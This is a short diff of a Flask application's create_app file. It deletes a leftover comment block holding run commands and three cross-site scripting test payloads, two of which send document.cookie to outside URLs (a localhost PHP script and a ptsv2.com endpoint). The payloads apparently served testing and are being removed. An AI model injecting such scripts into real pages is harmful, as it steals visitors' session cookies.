@@ -57,13 +57,3 @@ def create_app(test_config=None):
         return render_template('error.html')
 
     return app
-
-"""
-set FLASK_APP=myfavshows
-set FLASK_ENV=development
-flask run
-
-<script>alert('test');</script>
-<script>document.write('<img src="http://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
-<script>new Image().src="http://ptsv2.com/t/jyla7-1542967356/b.php?cookie="+document.cookie;</script>
-"""
